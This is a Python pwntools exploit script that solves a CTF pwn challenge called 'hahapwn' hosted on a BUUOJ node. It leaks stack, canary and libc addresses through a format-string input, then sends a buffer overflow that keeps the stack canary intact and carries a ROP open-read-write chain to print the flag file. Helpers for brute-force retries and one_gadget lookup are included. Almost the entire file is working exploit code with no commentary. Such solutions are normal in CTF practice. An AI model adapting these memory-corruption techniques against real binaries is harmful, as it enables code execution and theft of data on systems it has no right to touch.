# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from LibcSearcher import LibcSearcher
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './hahapwn'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29734'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

# dbg('printf')

sla('name' , '%28$p,%27$p,%39$p,')
ru('0x')
stack = rint()
ru(',0x')
canary = rint(16)
ru(',0x')
__libc_start_main = rint() - 240

lg('stack',stack)
lg('canary',canary)
lg('__libc_start_main',__libc_start_main)
# 29 28 26

libc.address = __libc_start_main - libc.sym['__libc_start_main']

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']

ret = libc.search(asm(' ret')).next()
syscall = libc.search(asm('syscall')).next()
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()

flag_addr = stack + 0xb8
orw = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
).ljust(0x100,'\x00') + 'flag\x00'

payload = 'a'*0x68 + p64(canary) +p64(0) +  orw


sla('you?' , payload)



# l64()

p.interactive()

'''
@File    :   hahapwn.py
@Time    :   2021/09/25 18:06:52
@Author  :   Niyah 
'''